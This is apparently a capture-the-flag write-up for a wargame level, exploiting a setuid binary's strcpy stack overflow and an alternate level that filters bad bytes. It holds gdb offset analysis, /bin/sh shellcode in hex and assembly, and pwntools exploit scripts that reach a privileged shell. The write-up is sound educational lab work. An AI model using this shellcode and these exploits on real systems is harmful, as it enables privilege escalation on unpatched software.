## First Look

```sh
level5@io:/levels$ ls -la level05*
-r-sr-x--- 1 level6 level5 7140 Nov 16  2007 level05
-r-sr-x--- 1 level6 level5 8752 Feb 22  2010 level05_alt
-r-------- 1 level5 level5 2954 Feb 24  2010 level05_alt.c
-r-------- 1 level5 level5  178 Oct  4  2007 level05.c
```
There are 2 ways to level6.

## level05.c

```sh
level5@io:/levels$ file level05
level05: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.4.1, not stripped
```

x86, intel, dynamically linked ELF.

```C
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

	char buf[128];

	if(argc < 2) return 1;

	strcpy(buf, argv[1]);

	printf("%s\n", buf);	

	return 0;
}
```
From the source code, we can see a `strcpy` to `buf` with no limit on the input length.
This means this code is vulnerable to buffer overflow.

Since there is no local variables like in level 4 that will conveniently spawn a shell, we will have to overwrite the return address to redirect executation to else where.

### Return address?

#### Where is the return address stored?
It is stored at the bottom of a function stack frame, above arugments but below local variables, thus it can be overwritten just like in level 4.

#### Why is this value on the stack?
This value is stored on the stack because the the assembly code `call <func1>` does 2 steps implicitly.
1. push address of next instruction to stack
2. jump the address of the desired function.

When entering the desired function, the function will set up (prologue) stack frame above this return address
and remove the frame when it exits (epilogue). The net increase/decrease before entering and exiting is zero.

#### What is the purpose of return address? 

##### basic background of x86 intel assembly
$eip = instruction pointer (contains address of next instruction)
$esp = stack pointer (indicates which address is considered top of stack)
$ebp = base pointer (a constant reference point that provide convenience in relative addressing of variables and arguments.)

common format of intel assembly
`<instruction> <destination>, <source>`

```asm
0x08123456 <func1>:	push ebp		//prologue
			mov ebp, esp		//prologue
			add eax, 2
			pop ebp			//epilogue
			ret
...
0x08041234 <main+5>:	mov eax, 5		<= eip
0x08041239 <main+10>:	call <func1>
0x0804123e <main+15>:	mov ebx, eax
...
```
Supposed there is a small function `<func1>` that just compute `eax = eax + 2`.
When the main function jump to func1, how does it know where to continue execution upon finishing func1?

In order for execution to continue at `<main+15>`, the next address `0x0804123e` need to be saved somewhere.
The register is one option but registers are very expensive. Hence, the next option is to save on the stack.

When `func1` sees a `ret` (return statement), it will pop the return address back into $eip (instruction pointer). $eip will tell the CPU, where is the next set of instruction (`mov ebx, eax`).

`eip` will contain the address 0x0804123e. 

Controlling the return address == controlling `eip` == We can go anywhere.

Buffer overflow allows attacker to redirect execution to any arbitrary legal/valid address.

### How many bytes to reach return address?

```sh
level5@io:/levels$ gdb level05
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from level05...done.
(gdb) source /usr/local/peda/peda.py
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080483b4 <+0>:	push   ebp
   0x080483b5 <+1>:	mov    ebp,esp
   0x080483b7 <+3>:	sub    esp,0xa8
   0x080483bd <+9>:	and    esp,0xfffffff0
	...
   0x080483e5 <+49>:	lea    eax,[ebp-0x88]
   0x080483eb <+55>:	mov    DWORD PTR [esp],eax
   0x080483ee <+58>:	call   0x80482d4 <strcpy@plt>
	...
   0x08048419 <+101>:	leave  
   0x0804841a <+102>:	ret    
End of assembler dump.
```

By looking the `strcpy`, we know from the source code that first argument is `buf`.
`ebp-0x88` is at the top of the stack, thus this is actually refering to `buf`.

From this, we know that it takes 0x88 bytes to reach the location of `ebp`. However, at <main+0>, there is a push ebp. This means ebp is above return address.
The 1 slot of the 32 bit stack takes 4 bytes.

Therefore, we will need 0x88 + 4 to reach the return address.

```sh
gdb-peda$ p/d 0x88 + 4
$1 = 140
```
A total of 140 bytes is needed.

To verify, we will set a break point before calling `ret`.

```sh
gdb-peda$ break *main+102
Breakpoint 1 at 0x804841a
gdb-peda$ run $(python -c "print 140*'A'+'BCDE'")
Starting program: /levels/level05 $(python -c "print 140*'A'+'BCDE'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x7fffff6f 
EDX: 0xb7fc3870 --> 0x0 
ESI: 0x2 
EDI: 0xb7fc2000 --> 0x1b3db0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffffbec ("BCDE")
EIP: 0x804841a (<main+102>:	ret)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048409 <main+85>:	mov    DWORD PTR [ebp-0x8c],0x0
   0x8048413 <main+95>:	mov    eax,DWORD PTR [ebp-0x8c]
   0x8048419 <main+101>:	leave  
=> 0x804841a <main+102>:	ret    
   0x804841b:	nop
   0x804841c:	nop
   0x804841d:	nop
   0x804841e:	nop
[------------------------------------stack-------------------------------------]
0000| 0xbffffbec ("BCDE")
0004| 0xbffffbf0 --> 0x0 
```

At the top of the stack, it has our string "BCDE".

```sh
gdb-peda$ si
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x7fffff6f 
EDX: 0xb7fc3870 --> 0x0 
ESI: 0x2 
EDI: 0xb7fc2000 --> 0x1b3db0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffffbf0 --> 0x0 
EIP: 0x45444342 ('BCDE')
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x45444342
[------------------------------------stack-------------------------------------]
0000| 0xbffffbf0 --> 0x0 
0004| 0xbffffbf4 --> 0xbffffc84 --> 0xbffffdae ("/levels/level05")
0008| 0xbffffbf8 --> 0xbffffc90 --> 0xbffffe4f ("XDG_SESSION_ID=124327")
0012| 0xbffffbfc --> 0x0 
0016| 0xbffffc00 --> 0x0 
0020| 0xbffffc04 --> 0x0 
0024| 0xbffffc08 --> 0xb7fc2000 --> 0x1b3db0 
0028| 0xbffffc0c --> 0xb7fffc0c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x45444342 in ?? ()
```

When we step one instruction, we realized that the EIP contains 0x45444342 which is 'EDCB' in ascii.
The program crash because this is an invalid address.
 
## Binary protections

```sh
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```
In this level, all the protections are turn off. 
One thing of interest is NX. 
NX is a protection mechanism by setting the stack as non-executable.

With this OFF, we can write our own machines language bytes that spawn a command shell on the stack, and make `eip` points to our introduced instructions.
These machine language are often known as shellcode.

### Shellcode?

#### Generate with pwntools shellcraft
```sh
$ pwn shellcraft i386.linux.sh
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/misskanari/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.0)
6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
```
The above is a shellcode that will spawn a shell from within an x86 linux binary.

```sh
$ pwn shellcraft i386.linux.sh -f a
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```
The assembly code to form that shellcode can be seen by adding format option `-f a`
In the ssh shell, the pwntool is not complete hence it is incapable of generating shellcode.

Another option of generating shellcode is via Metasploit framework - msfvenom. How to use it can be found easily online.

The above shellcode can be further shorten to `execve('/bin//sh', NULL, NULL)`. How to write shellcode will take an entire workshop to explain.

### Where to place shellcode?

The length of the shellcode is smaller than our required padding size of 140.
Therefore, we can try to put the shellcode at the start of the buffer and pad the remaining with NOP (no operation) with '\x90'.

We can find out where is `buf` by calculating 0xbffffbec - 4 - 0x88.
0xbffffbec is the location on the stack that contains the return address obtained earlier on.
```sh
[------------------------------------stack-------------------------------------]
0000| 0xbffffbec ("BCDE")
0004| 0xbffffbf0 --> 0x0
```

### exploit.py using pwntools

```python
from pwn import *

shellcode = "6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80".decode("hex")
retaddr = p32(0xbffffb60)   # auto pack integer into little endian
payload = shellcode + (140-len(shellcode))*'\x90' + retaddr

p = process(["/levels/level05", payload])
p.interactive()
```
The pwntool script.

```sh
level5@io:/tmp/t$ python exploit.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process '/levels/level05': pid 32243
[*] Switching to interactive mode
�Q��1�j\x0bX̀\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
$ id
uid=1005(level5) gid=1005(level5) euid=1006(level6) groups=1005(level5),1029(nosu)1�Qj\x04Y\x814$rijhh///sh/bin\x89�h
```

Another method is to do return to libc. 
Return to libc can bypass NX protection because the instructions are not found on the stack but from libraries function.
The values on the stacks are a list of addresses and arguments which are just values.
This is a difficult topic - return oriented programming.

## level05_alt.c
```C
//don't get trapped, there's no need
//level by bla
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define LOADERSIZE (232 + 16)
void* getASLRregion(int size, int flags);
void switchcontext(char* newstack, char* code);

int main(int argc, char* argv[], char* env[])
{
	char *newcode, *newstack;

	//allocate memory at random addresses
	newstack = getASLRregion(64 * 1024, PROT_READ | PROT_WRITE );
	newcode =  getASLRregion(64 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC);

	if(argc > 1)
	if(!strchr(argv[1], 0xcd))
	if(!strchr(argv[1], 0xe8))
	if(!strstr(argv[1], "\x0F\x34"))
	if(!strchr(argv[1], 0xdb)) {
		//prepare new code section, leaving some space for a loader
		strncpy(newcode + LOADERSIZE, argv[1], 1000);
		
		//start executing using a new stack and code section.
		switchcontext(newstack + 64 * 1024, newcode);
	}
	return 0;
}

/*************************************************************************************************************************/
/* HALT! The code below only provides a controllable aslr/noexec for this challenge, there's no need to waste time on it */
/*************************************************************************************************************************/
void __attribute__((constructor))initializePRNG(){int seed;FILE*devrand=fopen("/dev/random","r");if(devrand==0)exit(-1);
if(fread(&seed, 4, 1, devrand) != 1)exit(-1);fclose(devrand);srand(seed);}unsigned int loader[100]={0xe899c031,0};void*
getASLRregion(int size, int flags){int tries=1000,hint,res;while(tries--){hint=rand()<<12;res=(int)mmap((void*)hint,size
+4096,flags,MAP_PRIVATE|MAP_ANONYMOUS,0,0);if(hint==res){loader[++loader[1]+1]=hint;return (void*)(res+(rand()&0xffc));}
if(munmap((void*)res,size+4096))exit(-1);}exit(-1);}void switchcontext(char*newstack,char*code){loader[1]<<=2;memcpy(code
,loader,loader[1]+8);memcpy(code+loader[1]+8,"\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70"
"\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31"
"\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30"
"\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff"
"\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2"
"\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80"
"\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80"
"\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6"
"\xf3\xab\x31\xff",LOADERSIZE-16);asm("mov %0, %%esp\nmov %1,%%eax\njmp *%%eax"::"r"(newstack-4),"r"(code):"eax");}
```

In the above code, the program memory mapped 2 areas in the memory. The newstack memory area is given the read, write but no execute permission. The newcode memory area is given read, write and execute permission.

To verify, we can use gdb peda's `vmmap` before and after each get region.

In summary, the program is just copying 1000 bytes of our input into newcode, just right after the loader. The switchcontext then start executing the newcode. 
With read,write and execution permission, we can put our shellcode into this newcode and let the program run it.

**However, there is a catch!**

In the man page of `strchr`, we see that it locates a particular character in a string and return its location.
The program actually prevents us from injecting shellcode that has characters like '\xcd'.

Remember the shellcode we generated from shellcraft?

'\xcd\x80' is `int 0x80`, an interrupt to execute system call. With this filtered out, our previous shellcode will fail.

We call these undesirable characters as *bad characters*.

### Pwntools shellcraft + encoder

```python
from pwn import *

#asm will convert assembly code to machine code.
shellcode = asm( shellcraft.i386.linux.sh() )
avoids = '\xcd\xe8\x0f\x34\xdb'
encoded = encoders.encoder.encode(shellcode, avoids)

# keep trying random encoding.
while( len(encoded) > 1000):
	encoded = encoders.encoder.encode(shellcode, avoids)

print "FOUND!"
print "Length of encoded:", len(encoded)

assert not any(c in encoded for c in avoids)
print "all avoided"

#p = process(["/levels/level05_alt", encoded])		# the ssh shell doesn't have shellcraft
#p.interactive()

# output the encoded shellcode instead
print encoded.encode('hex')
```

We can tell the encoder what bytes we would like to avoid. The encoder will try its best to represent the shellcode with same resulting action. 
When I used a specific encoder like `encoders.i386.xor.encode` stated in pwntool's documentation, I found out that the length exceeded 1000.

Hence, I tried to use the generic `encode` function that will choose a random algorithm until it fits within 1000 bytes.

Sometimes, there could be too many bad characters such that the encoder might not find a way to remove all. Hence, it is a good idea to check if all the bad characters are avoided before using it.

```sh
$ python ./level5_alt_exploit.py 
FOUND!
Length of encoded: 114
all avoided
d9d0fcd97424f45e83c61889f7ac93ac28d8aa80ebac75f53ca6f65ec72f4776669544731e91c129a8d7f95bf76050be9c25a88ba91184854c4d3536b2b3028332666185ec5e258e44452b2c2354c0891d6ea30d070b237cd2d30bec085945ce593a76a7ab7d37a1aab5d62eab780282ac12
```

Next, I ssh back into level5 and copy paste the encoded shellcode using my previous script as template.

```python
from pwn import *

shellcode = "d9d0fcd97424f45e83c61889f7ac93ac28d8aa80ebac75f53ca6f65ec72f4776669544731e91c129a8d7f95bf76050be9c25a88ba91184854c4d3536b2b3028332666185ec5e258e44452b2c2354c0891d6ea30d070b237cd2d30bec085945ce593a76a7ab7d37a1aab5d62eab780282ac12".decode("hex")
payload = shellcode

p = process(["/levels/level05_alt", payload])
p.interactive()
```


```sh
level5@io:/tmp/t$ python exploit_alt.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process '/levels/level05_alt': pid 7833
[*] Switching to interactive mode
$ id
uid=1005(level5) gid=1005(level5) euid=1006(level6) groups=1005(level5),1029(nosu)
```

level5 alternate is much cooler than level5 alone :D
